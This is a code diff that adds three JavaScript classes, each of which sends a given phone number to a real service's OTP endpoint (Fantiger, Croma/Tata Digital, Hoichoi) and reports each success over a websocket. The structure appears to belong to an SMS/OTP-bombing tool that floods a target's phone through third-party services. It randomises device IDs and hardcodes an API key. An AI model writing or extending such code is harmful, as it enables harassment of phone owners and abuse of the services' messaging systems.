@@ -487,3 +487,105 @@ class watcho{
         })
     }
 }
+
+
+class fantiger{
+    constructor(number, ws){
+        fetch("https://admin.artistfirst.in/v1/auth/login-signup",{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json"
+            },
+            body:JSON.stringify({
+                "mobile": number,
+                "phoneCountryCode": "+91",
+                "userId": "66cc83f260d4e48db97b1e62"
+            })
+        }).then(res=>res.json()).then((data)=>{
+            if(data.code === 200)
+                ws.send("+1")
+        })
+    }
+}
+
+class croma{
+    constructor(number,ws){
+        fetch("https://api.tatadigital.com/api/v2/sso/check-phone-croma",{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json",
+                "client_id":"CROMA-WEB-APP"
+            },
+            body:JSON.stringify({
+                "countryCode": "91",
+                "phone": number
+            })
+        }).then(res=>res.json()).then((data)=>{
+            if(data.message === "User not found"){
+                fetch("https://api.tatadigital.com/api/v2/sso/check-phone",{
+                    method:"POST",
+                    headers:{
+                        "Content-Type":"application/json",
+                        "client_id":"CROMA-WEB-APP"
+                    },
+                    body:JSON.stringify({
+                        "countryCode": "91",
+                        "sendOtp": true,
+                        "phone": number
+                    })
+                }).then(res=>res.json()).then((data)=>{
+                    if(data.refId)
+                        ws.send("+1")
+                })
+            }else
+                ws.send("+1")
+        })
+    }
+}
+
+
+
+class hoichoi{
+    random(){
+        let ans = ""
+        for(let i = 0; i < 5; i++){
+            ans += Math.floor(Math.random()*10).toString()
+        }
+        return ans;
+    }
+    
+    constructor(number,ws){
+        fetch("https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-"+this.random()+"b43-1ea6-02dd-860c-"+this.random()+"bfc5b1f",{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json"
+            },
+            body:JSON.stringify({
+                "phoneNumber": "+91"+number,
+                "requestType": "send",
+                "screenName": "signin"
+            })
+        }).then(res=>res.json()).then((data)=>{
+            if(data.error){
+                fetch("https://prod-api.viewlift.com/identity/signup?site=hoichoitv&deviceId=browser-"+this.random()+"-a627-f106-af27-2b7"+this.random()+"5d82",{
+                    method:"POST",
+                    headers:{
+                        "Content-Type":"application/json",
+                        "x-api-key":"PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
+                    },
+                    body:JSON.stringify({
+                        "phoneNumber":"+91"+number,
+                        "requestType":"send",
+                        "whatsappConsent":true
+                    })
+                }).then(res=>res.json()).then((data)=>{
+                    if(data.sent === "true")
+                        ws.send("+1")
+                })
+            }else
+                ws.send("+1")
+        })
+    }
+}
+
+
